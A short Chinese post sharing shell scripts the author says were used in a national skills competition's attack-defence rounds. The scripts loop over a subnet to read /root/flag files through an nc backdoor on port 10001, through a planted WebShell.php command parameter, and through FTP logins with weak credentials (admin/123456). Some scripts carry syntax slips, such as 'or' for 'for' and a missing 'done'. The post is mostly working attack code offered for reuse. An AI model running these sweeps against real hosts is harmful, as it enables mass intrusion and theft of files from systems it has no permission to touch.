0x00 介绍

我在全国职业技能大赛比赛时所用的shell脚本:

nc后门:
port=10001 
for i in `seq 101 254`;
do
ip="192.168.2."$i
payload=`echo "cat /root/flag*.txt;exit" | nc $ip $port`
done

webshell:
or i in `seq 101 254`;
do
ip="192.168.2."$i
curl http://$ip/WebShell.php/?cmd=cat+%2Froot%2Fflag*.txt
done

ftp:
username='admin'
passwd='123456'
for i in `seq 101 254`;
do
ip="192.168.2."$i
sh ftpmain.sh $ip $username $passwd

#配合ftp使用
ftpmain:
ftp $1 -inv
user $2 $3
get /root/flag*.txt
bye
!

有一些地方得注意改动，什么IP地址NC后门的端口FTP那边的弱用户弱密码什么的等等…。
尤其是一些标点符号的小细节不能忘记，该空格的地方就得空格，最好先实验一遍在拿去实战
这些都可以拿到一些攻防比赛 如: CTF的AWD 或者一些 技能大赛
